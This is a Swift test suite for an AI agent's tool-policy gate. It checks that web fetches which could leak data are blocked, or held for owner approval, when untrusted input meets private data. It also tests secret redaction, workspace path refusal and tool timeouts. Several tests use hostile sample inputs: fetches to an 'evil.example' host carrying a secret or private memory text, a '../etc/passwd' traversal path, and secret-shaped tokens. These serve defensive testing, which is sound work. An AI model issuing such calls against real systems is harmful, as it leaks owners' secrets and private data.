import ClawCore
import Foundation
import Testing

@testable import ClawTools

/// Gate-test stand-ins declaring each egress class. `FetchLikeTool` resolves its target the way
/// web_fetch does (CanonicalURL + owner-facing refusal copy), so gate tests exercise the real
/// resolution contract without HTTP plumbing.
struct FetchLikeTool: Tool {
  var name = "web_fetch"

  var definition: ToolDefinition {
    ToolDefinition(
      name: name,
      description: "stub",
      parameters: .object(["type": .string("object")]),
      egressClass: .arbitraryDestination,
      riskLevel: .safe
    )
  }

  let timeout: Duration = .seconds(1)

  func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? {
    guard let rawURL = arguments.objectValue?["url"]?.stringValue, rawURL.isEmpty == false else {
      return .refused(reason: "\(name) needs a non-empty \"url\" argument.")
    }
    switch CanonicalURL.canonicalize(rawURL) {
    case .success(let canonical):
      return .resolved(canonical)
    case .failure:
      return .refused(reason: "That is not a valid URL.")
    }
  }

  func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
    ToolPayload(content: "fetched", status: .ok, ingestedUntrusted: true)
  }
}

struct SearchLikeTool: Tool {
  let definition = ToolDefinition(
    name: "web_search",
    description: "stub",
    parameters: .object(["type": .string("object")]),
    egressClass: .fixedEndpoint,
    riskLevel: .safe
  )
  let timeout: Duration = .seconds(1)

  func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? { nil }

  func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
    ToolPayload(content: "results", status: .ok, ingestedUntrusted: true)
  }
}

/// A scripted ask-tier stand-in modeling `file_write`: egress `.none` (its args never leave the
/// machine) yet risk `.ask`, resolving a canonical target at gate time and authoring a blast-radius
/// presentation. Exercises the ask-tier arm without a real filesystem.
struct WriteLikeTool: Tool {
  var name = "file_write"
  var resolution: CanonicalTargetResolution? = .resolved("/workspace/notes/plan.md")

  var definition: ToolDefinition {
    ToolDefinition(
      name: name,
      description: "stub",
      parameters: .object(["type": .string("object")]),
      egressClass: .none,
      riskLevel: .ask
    )
  }

  let timeout: Duration = .seconds(1)

  func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? { resolution }

  func approvalPresentation(
    arguments: JSONValue,
    canonicalTarget: String
  ) -> ToolApprovalPresentation {
    ToolApprovalPresentation(
      blastRadius: "create, 12 B",
      contentPreview: arguments.objectValue?["content"]?.stringValue,
      warnings: []
    )
  }

  func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
    ToolPayload(content: "written", status: .ok, ingestedUntrusted: false)
  }
}

@Suite struct ToolPolicyGateTests {
  private static let memoryText = "The owner's private project is called Operation Nightjar Falcon."

  private func makeGate(
    privateFiles: [String] = [ToolPolicyGateTests.memoryText]
  ) -> ToolPolicyGate {
    ToolPolicyGate(
      argGuard: ExfilArgGuard(secretValues: ["s3cret-value-1"]),
      privateFileLoader: { privateFiles }
    )
  }

  private func makeContext(
    tainted: Bool = false,
    runIngested: Bool = false,
    assemblyPrivate: Bool = false,
    runPrivate: Bool = false,
    sessionHasPrivate: Bool = false,
    grant: OneTurnGrant? = nil,
    approvalPending: Bool = false,
    nonInteractive: Bool = false
  ) -> ToolDispatchContext {
    ToolDispatchContext(
      sessionTainted: tainted,
      runIngestedUntrusted: runIngested,
      assemblyPrivateData: assemblyPrivate,
      runPrivateData: runPrivate,
      sessionHasPrivateData: sessionHasPrivate,
      grant: grant,
      approvalAlreadyPending: approvalPending,
      nonInteractive: nonInteractive
    )
  }

  private func fetchCall(_ url: String) -> ToolCall {
    ToolCall(id: "c1", name: "web_fetch", argumentsJSON: #"{"url":"\#(url)"}"#)
  }

  @Test func classDeclarationNotToolNameDrivesTheApprovalTier() {
    // given — an egress tool the gate has never heard of by name, declared arbitrary-destination
    let webhookTool = FetchLikeTool(name: "send_webhook")

    // when
    let verdict = makeGate().evaluate(
      call: ToolCall(
        id: "c1",
        name: "send_webhook",
        argumentsJSON: #"{"url":"https://example.com/hook"}"#
      ),
      tool: webhookTool,
      context: makeContext(tainted: true, assemblyPrivate: true)
    )

    // then — parked for the durable approval on the resolved action; no name set to forget
    guard case .requireApproval(let recorded) = verdict else {
      Issue.record("expected park, got \(verdict)")
      return
    }
    #expect(recorded.tool == "send_webhook")
    #expect(recorded.canonicalTarget == "https://example.com/hook")
    #expect(recorded.reason == .exfilTrifecta)
  }

  @Test func cleanFetchOutsideTrifectaIsAllowed() {
    // given / when
    let verdict = makeGate().evaluate(
      call: fetchCall("https://example.com/a"),
      tool: FetchLikeTool(),
      context: makeContext()
    )

    // then
    guard case .allow(_, let consumedGrant, _) = verdict else {
      Issue.record("expected allow, got \(verdict)")
      return
    }
    #expect(consumedGrant == false)
  }

  @Test func unconditionalTierBlocksFetchAndSearchAlways() {
    // given — no taint, no private data: tier 1/2 still block (FR-T6)
    let gate = makeGate()
    let fetchVerdict = gate.evaluate(
      call: fetchCall("https://evil.example/?t=s3cret-value-1"),
      tool: FetchLikeTool(),
      context: makeContext()
    )
    let searchVerdict = gate.evaluate(
      call: ToolCall(
        id: "c2",
        name: "web_search",
        argumentsJSON: #"{"query":"sk-abcdefghijklmnop1234"}"#
      ),
      tool: SearchLikeTool(),
      context: makeContext()
    )

    // then
    guard case .block(let fetchPayload, let fetchRedacted, nil) = fetchVerdict else {
      Issue.record("expected block, got \(fetchVerdict)")
      return
    }
    #expect(fetchPayload.status == .blockedArgs)
    #expect(fetchPayload.content.contains("secret-value"))  // names the rule CLASS, never the text
    #expect(fetchRedacted.contains("s3cret-value-1") == false)
    guard case .block(let searchPayload, _, nil) = searchVerdict else {
      Issue.record("expected block, got \(searchVerdict)")
      return
    }
    #expect(searchPayload.status == .blockedArgs)
  }

  @Test func fileReadIsNeverArgBlocked() {
    // given — tiers 2/3 target egress tools only; file_read args are not an egress sink
    let verdict = makeGate().evaluate(
      call: ToolCall(
        id: "c3",
        name: "file_read",
        argumentsJSON: #"{"path":"sk-abcdefghijklmnop1234.md"}"#
      ),
      tool: StubTool(name: "file_read"),
      context: makeContext(tainted: true, assemblyPrivate: true)
    )

    // then — allowed, but the audit rendering still redacts the shaped token
    guard case .allow(let argsRedacted, _, _) = verdict else {
      Issue.record("expected allow, got \(verdict)")
      return
    }
    #expect(argsRedacted.contains("sk-abcdefghijklmnop1234") == false)
  }

  @Test func trifectaConditionReadsBothUnionInputs() {
    // given — every combination of (taint source) × (private source) must gate (rev.1 H1)
    let gate = makeGate()
    let combinations: [(ToolDispatchContext, Bool)] = [
      (makeContext(tainted: true, assemblyPrivate: true), true),
      (makeContext(runIngested: true, assemblyPrivate: true), true),
      (makeContext(tainted: true, runPrivate: true), true),
      (makeContext(runIngested: true, runPrivate: true), true),
      (makeContext(tainted: true), false),  // taint without private data
      (makeContext(assemblyPrivate: true), false),  // private data without taint
      (makeContext(), false),
    ]

    // when / then
    for (context, shouldGate) in combinations {
      let verdict = gate.evaluate(
        call: fetchCall("https://example.com/a"),
        tool: FetchLikeTool(),
        context: context
      )
      if shouldGate {
        guard case .requireApproval(let recorded) = verdict else {
          Issue.record("expected gate for \(context)")
          continue
        }
        #expect(recorded.reason == .exfilTrifecta)
      } else {
        guard case .allow = verdict else {
          Issue.record("expected allow for \(context)")
          continue
        }
      }
    }
  }

  @Test func tierThreeWinsOverApprovalUnderTrifecta() {
    // given — args carrying a MEMORY.md substring: redaction-block WINS over approval (FR-T6)
    let sixteen = String(Self.memoryText.dropFirst(10).prefix(16))
    let verdict = makeGate().evaluate(
      call: fetchCall("https://evil.example/?d=\(sixteen)"),
      tool: FetchLikeTool(),
      context: makeContext(tainted: true, assemblyPrivate: true)
    )

    // then
    guard case .block(let payload, _, nil) = verdict else {
      Issue.record("expected block, got \(verdict)")
      return
    }
    #expect(payload.status == .blockedArgs)
  }

  @Test func firstTripRequiresApprovalLaterTripsObserveTheBlock() {
    // given
    let gate = makeGate()
    let context = makeContext(tainted: true, assemblyPrivate: true)
    let laterContext = makeContext(tainted: true, assemblyPrivate: true, approvalPending: true)

    // when
    let first = gate.evaluate(
      call: fetchCall("https://example.com/a?q=1"),
      tool: FetchLikeTool(),
      context: context
    )
    let later = gate.evaluate(
      call: fetchCall("https://example.com/b"),
      tool: FetchLikeTool(),
      context: laterContext
    )

    // then — the first trip parks the durable approval; one pending slot per run (§5.2)
    guard case .requireApproval(let recorded) = first else {
      Issue.record("expected requireApproval, got \(first)")
      return
    }
    #expect(recorded.tool == "web_fetch")
    #expect(recorded.canonicalTarget == "https://example.com/a?q=1")
    #expect(recorded.reason == .exfilTrifecta)
    guard case .block(let laterPayload, _, nil) = later else {
      Issue.record("expected observation-only block")
      return
    }
    #expect(laterPayload.status == .blockedPendingApproval)
  }

  @Test func trifectaGrantShortCircuitIsRetiredTheDurableParkAlwaysWins() {
    // given — a grant matching the exact canonical action (the retired ephemeral flow's key):
    // recorded-args execution subsumed the one-turn grant, so the gate must ignore it and park
    let gate = makeGate()
    let grant = OneTurnGrant(
      action: ToolAction(tool: "web_fetch", target: "https://example.com/a?q=1")
    )

    // when
    let verdict = gate.evaluate(
      call: fetchCall("https://Example.com/a?q=1"),  // canonicalizes to the grant key
      tool: FetchLikeTool(),
      context: makeContext(tainted: true, assemblyPrivate: true, grant: grant)
    )

    // then — no grant consumption; the durable approval parks regardless
    guard case .requireApproval(let recorded) = verdict else {
      Issue.record("expected requireApproval, got \(verdict)")
      return
    }
    #expect(recorded.canonicalTarget == "https://example.com/a?q=1")
    #expect(recorded.reason == .exfilTrifecta)
  }

  @Test func urlPolicyRefusalUnderTrifectaIsAnErrorBeforeAnyPrompt() {
    // given — userinfo/IDN refused at gate time, BEFORE an approval is requested (§9.2)
    let verdict = makeGate().evaluate(
      call: fetchCall("https://user:pw@example.com/"),
      tool: FetchLikeTool(),
      context: makeContext(tainted: true, assemblyPrivate: true)
    )

    // then — the gate now blocks on the tool's own resolution copy, on every path
    guard case .block(let payload, _, nil) = verdict else {
      Issue.record("expected block, got \(verdict)")
      return
    }
    #expect(payload.status == .error)
    #expect(payload.content == "That is not a valid URL.")
  }

  @Test func missingUrlUnderTrifectaRefusesWithTheResolutionCopy() {
    // given — a fetch with no "url" argument resolves to a refusal at the gate (delta: unified copy)
    let verdict = makeGate().evaluate(
      call: ToolCall(id: "c1", name: "web_fetch", argumentsJSON: "{}"),
      tool: FetchLikeTool(),
      context: makeContext(tainted: true, assemblyPrivate: true)
    )

    // then
    guard case .block(let payload, _, nil) = verdict else {
      Issue.record("expected block, got \(verdict)")
      return
    }
    #expect(payload.status == .error)
    #expect(payload.content == #"web_fetch needs a non-empty "url" argument."#)
  }

  @Test func nonInteractiveRunsLeaveEveryEarlierTierUntouched() {
    // given — tier-1/2 blocks and the outside-trifecta allow behave identically non-interactively
    let gate = makeGate()

    // when
    let argBlock = gate.evaluate(
      call: fetchCall("https://evil.example/?t=s3cret-value-1"),
      tool: FetchLikeTool(),
      context: makeContext(nonInteractive: true)
    )
    let cleanAllow = gate.evaluate(
      call: fetchCall("https://example.com/a"),
      tool: FetchLikeTool(),
      context: makeContext(nonInteractive: true)
    )

    // then
    guard case .block(let payload, _, nil) = argBlock else {
      Issue.record("expected blocked args, got \(argBlock)")
      return
    }
    #expect(payload.status == .blockedArgs)
    guard case .allow = cleanAllow else {
      Issue.record("expected allow, got \(cleanAllow)")
      return
    }
  }

  @Test func askTierReachesApprovalDespiteNoneEgress() {
    // given — an ask-tier tool whose egress class is .none; the old gate short-circuited every
    // .none tool to .allow before any evaluation (§4.3 breaks that)
    let call = ToolCall(
      id: "c1",
      name: "file_write",
      argumentsJSON: #"{"path":"notes/plan.md","content":"hi"}"#
    )

    // when
    let verdict = makeGate().evaluate(call: call, tool: WriteLikeTool(), context: makeContext())

    // then — reached the durable approval arm on the gate-resolved target, not the fast-path allow
    guard case .requireApproval(let recorded) = verdict else {
      Issue.record("expected requireApproval, got \(verdict)")
      return
    }
    #expect(recorded.tool == "file_write")
    #expect(recorded.canonicalTarget == "/workspace/notes/plan.md")
    #expect(recorded.reason == .askTier)
  }

  @Test func askTierRecordsCanonicalArgsHashAndPresentation() {
    // given
    let call = ToolCall(
      id: "c1",
      name: "file_write",
      argumentsJSON: #"{"path":"notes/plan.md","content":"hi"}"#
    )

    // when
    let verdict = makeGate().evaluate(call: call, tool: WriteLikeTool(), context: makeContext())

    // then — canonical args are sorted-keys JSON, the hash is over exactly that string (the
    // approve CAS recomputes it, §6.2 step 5), and the tool's presentation rides along (Task 13)
    guard case .requireApproval(let recorded) = verdict else {
      Issue.record("expected requireApproval, got \(verdict)")
      return
    }
    #expect(recorded.canonicalArgsJSON == #"{"content":"hi","path":"notes/plan.md"}"#)
    #expect(recorded.argsHash == ApprovalArgsHash.sha256Hex(recorded.canonicalArgsJSON))
    #expect(recorded.presentation.blastRadius == "create, 12 B")
    #expect(recorded.presentation.contentPreview == "hi")
  }

  @Test func askTierRefusedTargetBlocksBeforeApproval() {
    // given — an ask-tier tool that refuses to resolve a target (as web_fetch does on a bad URL)
    let refusing = WriteLikeTool(resolution: .refused(reason: "path escapes the workspace."))

    // when
    let verdict = makeGate().evaluate(
      call: ToolCall(id: "c1", name: "file_write", argumentsJSON: #"{"path":"../etc/passwd"}"#),
      tool: refusing,
      context: makeContext()
    )

    // then — a refusal blocks with the tool's copy; no approval is recorded (fail-closed, §4.3)
    guard case .block(let payload, _, let pendingApproval) = verdict else {
      Issue.record("expected block, got \(verdict)")
      return
    }
    #expect(payload.status == .error)
    #expect(payload.content == "path escapes the workspace.")
    #expect(pendingApproval == nil)
  }

  @Test func askTierWithAPendingApprovalYieldsTheBlockedObservation() {
    // given — the run's single approval slot is already occupied (§5.2, one pending per run)
    // when
    let verdict = makeGate().evaluate(
      call: ToolCall(
        id: "c2",
        name: "file_write",
        argumentsJSON: #"{"path":"notes/two.md","content":"x"}"#
      ),
      tool: WriteLikeTool(),
      context: makeContext(approvalPending: true)
    )

    // then — further ask-tier calls observe the block, never a second park
    guard case .block(let payload, _, let pendingApproval) = verdict else {
      Issue.record("expected blocked observation, got \(verdict)")
      return
    }
    #expect(payload.status == .blockedPendingApproval)
    #expect(pendingApproval == nil)
  }

  @Test func persistedPrivateDataFlagArmsTheTrifectaAndRequiresApproval() throws {
    // given — taint present; the ONLY private-data source is the persisted session flag (assembly
    // and run legs both false). This is the §12 over-cap gap the flag closes.
    let gate = makeGate()
    let call = ToolCall(
      id: "f1",
      name: "web_fetch",
      argumentsJSON: #"{"url":"https://x.example/"}"#
    )
    let context = makeContext(tainted: true, sessionHasPrivate: true)

    // when
    let verdict = gate.evaluate(call: call, tool: FetchLikeTool(), context: context)

    // then — durable arm, reason exfilTrifecta, target fully resolved
    guard case .requireApproval(let recorded) = verdict else {
      Issue.record("expected .requireApproval, got \(verdict)")
      return
    }
    #expect(recorded.tool == "web_fetch")
    #expect(recorded.reason == .exfilTrifecta)
    #expect(recorded.canonicalTarget == "https://x.example/")
  }

  @Test func trifectaWithoutAnyPrivateLegDoesNotRequireApproval() throws {
    // given — taint but NO private-data source of any kind
    let gate = makeGate()
    let call = ToolCall(
      id: "f1",
      name: "web_fetch",
      argumentsJSON: #"{"url":"https://x.example/"}"#
    )
    let context = makeContext(tainted: true)

    // when
    let verdict = gate.evaluate(call: call, tool: FetchLikeTool(), context: context)

    // then — the fetch is allowed on its resolved target; no approval
    guard case .allow(_, _, let action) = verdict else {
      Issue.record("expected .allow, got \(verdict)")
      return
    }
    #expect(action?.target == "https://x.example/")
  }

  @Test func nonInteractiveTrifectaParksInsteadOfImmediateDeny() throws {
    // given — a scheduled/heartbeat run hitting the trifecta (§5.1): NO immediate gate DENY
    let gate = makeGate()
    let call = ToolCall(
      id: "f1",
      name: "web_fetch",
      argumentsJSON: #"{"url":"https://x.example/"}"#
    )
    let context = makeContext(tainted: true, runPrivate: true, nonInteractive: true)

    // when
    let verdict = gate.evaluate(call: call, tool: FetchLikeTool(), context: context)

    // then — the same durable park an interactive run takes; the immediate-DENY branch is gone
    guard case .requireApproval(let recorded) = verdict else {
      Issue.record("expected .requireApproval for a non-interactive run, got \(verdict)")
      return
    }
    #expect(recorded.reason == .exfilTrifecta)
  }

  @Test func trifectaWithAnApprovalAlreadyPendingBlocksWithoutRequiringAnother() throws {
    // given — one pending approval already exists for the run (§5.2)
    let gate = makeGate()
    let call = ToolCall(
      id: "f1",
      name: "web_fetch",
      argumentsJSON: #"{"url":"https://x.example/"}"#
    )
    let context = makeContext(tainted: true, runPrivate: true, approvalPending: true)

    // when
    let verdict = gate.evaluate(call: call, tool: FetchLikeTool(), context: context)

    // then — a blocked observation, NOT a second .requireApproval
    guard case .block(let payload, _, _) = verdict else {
      Issue.record("expected .block, got \(verdict)")
      return
    }
    #expect(payload.status == .blockedPendingApproval)
  }

  @Test func restructureKeepsRedactionAheadOfTheTrifectaApproval() {
    // given — a .safe egress tool under trifecta whose args carry a MEMORY.md substring: the
    // ask-tier arm is skipped (safe), so the tier-3 redaction block must still win over the
    // trifecta approval exactly as before the reorder (§5.1(b) — arg-guard/redaction ordering
    // unchanged for the non-ask paths)
    let sixteen = String(Self.memoryText.dropFirst(10).prefix(16))

    // when
    let verdict = makeGate().evaluate(
      call: fetchCall("https://evil.example/?d=\(sixteen)"),
      tool: FetchLikeTool(),
      context: makeContext(tainted: true, assemblyPrivate: true)
    )

    // then
    guard case .block(let payload, _, let pendingApproval) = verdict else {
      Issue.record("expected block, got \(verdict)")
      return
    }
    #expect(payload.status == .blockedArgs)
    #expect(pendingApproval == nil)
  }
}

@Suite struct GatedToolDispatcherTests {
  private func makeDispatcher(
    tools: [any Tool],
    privateFiles: [String] = [],
    sleep: @escaping @Sendable (Duration) async throws -> Void = { try await Task.sleep(for: $0) }
  ) -> GatedToolDispatcher {
    GatedToolDispatcher(
      registry: ToolRegistry(tools: tools),
      gate: ToolPolicyGate(
        argGuard: ExfilArgGuard(secretValues: []),
        privateFileLoader: { privateFiles }
      ),
      sleep: sleep
    )
  }

  private let openContext = ToolDispatchContext(
    sessionTainted: false,
    runIngestedUntrusted: false,
    assemblyPrivateData: false,
    runPrivateData: false,
    sessionHasPrivateData: false,
    grant: nil,
    approvalAlreadyPending: false,
    nonInteractive: false
  )

  @Test func unknownToolIsAnErrorObservationNeverACrash() async {
    // given
    let dispatcher = makeDispatcher(tools: [StubTool(name: "file_read")])

    // when
    let outcome = await dispatcher.dispatch(
      call: ToolCall(id: "c1", name: "shell_exec", argumentsJSON: "{}"),
      context: openContext
    )

    // then
    #expect(outcome.observation.status == .error)
    #expect(outcome.observation.content.contains("shell_exec"))
    #expect(outcome.observation.ingestedUntrusted == false)
  }

  @Test func errorPathArgsAreRedactedNotRaw() async {
    // given — an unknown tool called with a secret-SHAPED token in its args: even though the call
    // never reaches the gate, the audit rendering must not re-contain it (seam contract)
    let dispatcher = makeDispatcher(tools: [StubTool(name: "file_read")])

    // when
    let outcome = await dispatcher.dispatch(
      call: ToolCall(
        id: "c1",
        name: "shell_exec",
        argumentsJSON: #"{"cmd":"sk-abcdefghijklmnop1234"}"#
      ),
      context: openContext
    )

    // then — error observation, and the shaped token is redacted out of the audit args
    #expect(outcome.observation.status == .error)
    #expect(outcome.argsRedacted.contains("sk-abcdefghijklmnop1234") == false)
  }

  @Test func malformedArgumentsAreAnErrorObservation() async {
    // given
    let dispatcher = makeDispatcher(tools: [StubTool(name: "file_read")])

    // when
    let outcome = await dispatcher.dispatch(
      call: ToolCall(id: "c1", name: "file_read", argumentsJSON: "{broken"),
      context: openContext
    )

    // then
    #expect(outcome.observation.status == .error)
  }

  @Test func allowedCallExecutesAndStampsIdentity() async {
    // given
    let dispatcher = makeDispatcher(tools: [
      StubTool(
        name: "file_read",
        payload: ToolPayload(content: "file text", status: .ok, ingestedUntrusted: true)
      )
    ])

    // when
    let outcome = await dispatcher.dispatch(
      call: ToolCall(id: "c7", name: "file_read", argumentsJSON: #"{"path":"a.md"}"#),
      context: openContext
    )

    // then
    #expect(outcome.observation.callId == "c7")
    #expect(outcome.observation.toolName == "file_read")
    #expect(outcome.observation.content == "file text")
    #expect(outcome.observation.ingestedUntrusted)
  }

  @Test func executeReceivesTheGateResolvedCanonicalTarget() async {
    // given — a recording arbitrary-destination tool
    actor TargetRecorder {
      private(set) var received: String?

      func record(_ target: String?) { received = target }
    }
    struct RecordingFetchTool: Tool {
      let recorder: TargetRecorder
      let definition = ToolDefinition(
        name: "web_fetch",
        description: "stub",
        parameters: .object(["type": .string("object")]),
        egressClass: .arbitraryDestination,
        riskLevel: .safe
      )
      let timeout: Duration = .seconds(1)

      func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? {
        guard let rawURL = arguments.objectValue?["url"]?.stringValue else {
          return .refused(reason: "web_fetch needs a non-empty \"url\" argument.")
        }
        switch CanonicalURL.canonicalize(rawURL) {
        case .success(let canonical): return .resolved(canonical)
        case .failure: return .refused(reason: "That is not a valid URL.")
        }
      }

      func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
        await recorder.record(canonicalTarget)
        return ToolPayload(content: "ok", status: .ok, ingestedUntrusted: true)
      }
    }
    let recorder = TargetRecorder()
    let dispatcher = makeDispatcher(tools: [RecordingFetchTool(recorder: recorder)])

    // when
    _ = await dispatcher.dispatch(
      call: ToolCall(
        id: "c1",
        name: "web_fetch",
        argumentsJSON: #"{"url":"https://example.com/a"}"#
      ),
      context: openContext
    )

    // then — the tool acted on the gate-resolved form, not a re-derived one
    #expect(await recorder.received == "https://example.com/a")
  }

  @Test func slowToolTimesOutWithAnErrorObservation() async {
    // given — a tool that sleeps past its own tiny timeout
    struct SlowTool: Tool {
      let definition = ToolDefinition(
        name: "slow",
        description: "slow",
        parameters: .object(["type": .string("object")]),
        egressClass: .none,
        riskLevel: .safe
      )
      let timeout: Duration = .milliseconds(20)

      func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? { nil }

      func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
        try? await Task.sleep(for: .seconds(10))
        return ToolPayload(content: "late", status: .ok, ingestedUntrusted: true)
      }
    }
    let dispatcher = makeDispatcher(tools: [SlowTool()])

    // when
    let outcome = await dispatcher.dispatch(
      call: ToolCall(id: "c1", name: "slow", argumentsJSON: "{}"),
      context: openContext
    )

    // then — the timeout is an observation, and the late success never leaks
    #expect(outcome.observation.status == .error)
    #expect(outcome.observation.content.contains("timed out"))
    #expect(outcome.observation.ingestedUntrusted == false)
  }

  @Test(.timeLimit(.minutes(1)))
  func wedgedToolIsAbandonedAtTimeoutNotAwaited() async {
    // given — a tool that never returns and ignores cancellation; the injected sleep makes the
    // timeout arm fire immediately, so no wall clock is involved on the green path
    let release = WedgeRelease()
    let dispatcher = makeDispatcher(tools: [WedgedTool(release: release)], sleep: { _ in })

    // when — under group-await semantics this call would NEVER return (the group awaits the
    // wedged child); the time limit converts that hang into a failure
    let outcome = await dispatcher.dispatch(
      call: ToolCall(id: "c1", name: "wedged", argumentsJSON: "{}"),
      context: openContext
    )

    // then — the timeout observation returns while the tool is still wedged
    #expect(outcome.observation.status == .error)
    #expect(outcome.observation.content.contains("timed out"))

    // release the abandoned task so it finishes before the suite exits
    await release.release()
  }
}

/// Blocks until released and IGNORES task cancellation — models a blocking syscall
/// (`getaddrinfo`) or hung I/O that cooperative cancellation cannot interrupt.
actor WedgeRelease {
  private var waiters: [CheckedContinuation<Void, Never>] = []
  private var released = false

  func wait() async {
    if released { return }
    await withCheckedContinuation { waiters.append($0) }
  }

  func release() {
    released = true
    for waiter in waiters {
      waiter.resume()
    }
    waiters.removeAll()
  }
}

struct WedgedTool: Tool {
  let release: WedgeRelease
  let definition = ToolDefinition(
    name: "wedged",
    description: "wedged",
    parameters: .object(["type": .string("object")]),
    egressClass: .none,
    riskLevel: .safe
  )
  let timeout: Duration = .seconds(30)

  func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? { nil }

  func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
    await release.wait()
    return ToolPayload(content: "late", status: .ok, ingestedUntrusted: false)
  }
}
